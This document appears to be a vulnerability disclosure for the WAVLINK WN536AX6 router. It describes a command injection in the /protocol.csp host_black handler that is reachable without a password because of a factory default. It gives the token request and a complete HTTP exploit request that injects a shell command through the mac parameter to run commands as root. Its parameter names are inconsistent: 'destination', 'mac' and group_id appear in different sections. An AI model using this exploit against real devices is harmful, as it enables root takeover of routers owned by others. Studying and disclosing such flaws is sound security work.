# WAVLINK WN536AX6



- Vendor: WAVLINK
- Product: WN536AX6
- Firmware Version: V260507
- Vulnerability Type:Authenticated Command Injection

# Description

​		WAVLINK WN536AX6-A 路由器的 `/protocol.csp` 中 `host_black` 处理器存在一个**已验证命令注入漏洞**。攻击者可通过可控的 `mac` 参数利用该漏洞，导致以 root 权限执行远程代码。虽然该漏洞需要有效的会话令牌才能利用，但认证可以被轻易绕过：设备出厂时默认启用 `FirstLogin=1`（即默认开启无密码登录），攻击者只需发送一个无需认证的登录请求即可获取有效令牌

#   Impact

An authenticated attacker can inject arbitrary shell commands through the `destination` parameter and execute them with the privileges of the web service, potentially resulting in full compromise of the device.

#   Vulnerability Details

在 ioos Web 后端 `/protocol.csp` 的 host_black（`fname=net&opt=host_black&function=set`）中，请求参数`mac` 在被直接拼接到 shell 命令 `setup_bannet_list.sh add \"%s\"` 之前未经过任何过滤或 sanitization，随后该命令通过 `system()` 执行。在设备的出厂默认配置下（`FirstLogin=1`，即启用无密码认证），攻击者仅需两步即可获得 root shell：首先发送请求到 `fname=system&opt=login&function=set&usrid=` 获取会话令牌；然后携带该令牌，访问包含注入 payload `group_id=aa" | <任意命令> #` 的请求，即可触发以 root 权限执行任意命令。

![image-20260809211338954](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809211338954.png)

![image-20260809211406510](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809211406510.png)



Obtain the token, then perform the exploit.

http://192.168.10.3/protocol.csp?fname=system&opt=login&function=set&usrid=

![image-20260809212936326](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809212936326.png)

**Obtain the token, then exploit the vulnerability.**

**exp**

```http
GET /protocol.csp?fname=net&opt=host_black&function=set&mac=aa%22%20%7C%20touch%20%2Fbannet_ax6%20%23&devname=dev&index=1&token=AF1F0B2C37186B9640E8DED882A6D8A7 HTTP/1.1

Host: 192.168.10.3

Cookie: i18next=en_US

Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"

Accept: application/json, text/javascript, */*; q=0.01

X-Requested-With: XMLHttpRequest

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Sec-Ch-Ua-Platform: "Linux"

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://192.168.10.3/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Priority: u=1, i

Connection: close




```

# **Reproduction Results**

![image-20260809200832092](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809200832092.png)

![image-20260809212953162](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809212953162.png)

![image-20260809213014521](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260809213014521.png)
